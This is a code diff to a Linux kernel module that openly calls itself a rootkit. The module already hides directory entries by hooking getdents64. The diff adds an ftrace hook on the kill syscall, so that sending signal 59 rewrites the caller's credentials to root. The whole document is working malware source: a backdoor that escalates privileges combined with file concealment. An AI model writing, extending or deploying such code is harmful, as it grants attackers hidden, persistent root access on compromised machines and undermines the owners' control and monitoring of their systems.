@@ -3,14 +3,20 @@
 #include <linux/init.h>
 #include <linux/dirent.h>
 #include <linux/string.h>
+#include <linux/cred.h>
 #include "ftrace_helper.h"
 
 // Forward declare functions
 static long filter_dirents(void __user *user_dir, long n, bool is_64);
 static bool should_hide_name(const char *curr_name);
 
+/* directory hiding */
 static asmlinkage long fake_getdents64(const struct pt_regs *regs);
 static asmlinkage long (*real_getdents64)(const struct pt_regs *regs);
+
+/* priv escalation */
+static asmlinkage long fake_kill64(const struct pt_regs *regs);
+static asmlinkage long (*real_kill64)(const struct pt_regs *regs);
 
 // Function pointer for our symbol searching function
 extern unsigned long (*kallsyms_lookup_name_fn)(const char *name);
@@ -38,9 +44,50 @@ ftrace_hook dirents_hook = {
     .original = &real_getdents64,
 };
 
+ftrace_hook kill_hook = {
+    .name = "__x64_sys_kill",
+    .function = fake_kill64,
+    .original = &real_kill64,
+};
+
+/* START NEW STUFF */
+static asmlinkage long fake_kill64(const struct pt_regs *regs)
+{
+    /* Extract syscall arguments */
+    int pid = (int)regs->di;
+    int signal = (int)regs->si;
+
+    /* Check if we passed our special kill signal */
+    if (signal == 59) {
+        struct cred *new_creds;
+        new_creds = prepare_creds();
+        if (!new_creds) {
+            pr_info("[rootkit] ERROR: Couldn't create new credentials for PID: %d\n", pid);
+            return 0;
+        }
+
+        /* Update our creds to root */
+        new_creds->uid.val   = 0;
+        new_creds->gid.val   = 0;
+        new_creds->suid.val  = 0;
+        new_creds->sgid.val  = 0;
+        new_creds->fsuid.val = 0;
+        new_creds->fsgid.val = 0;
+        new_creds->euid.val  = 0;
+        new_creds->egid.val  = 0;
+
+        commit_creds(new_creds);
+
+        return 0;
+    }
+
+    /* Otherwise just do kill! */
+    return real_kill64(regs);
+}
+/* END NEW STUFF */
+
 static asmlinkage long fake_getdents64(const struct pt_regs *regs)
 {
-    pr_info("[rootkit] - called fake_getdents64\n");
     long ret = real_getdents64(regs);
     if (ret <= 0) return ret;
 
@@ -128,6 +175,7 @@ int init_rootkit(void)
 {
     pr_info("[rootkit] - Hello\n");
     install_hook(&dirents_hook);
+    install_hook(&kill_hook);
     
     return 0;
 }
@@ -135,6 +183,7 @@ int init_rootkit(void)
 void exit_rootkit(void)
 {
     remove_hook(&dirents_hook);
+    remove_hook(&kill_hook);
     pr_info("[rootkit] - Bye\n");
 }
 
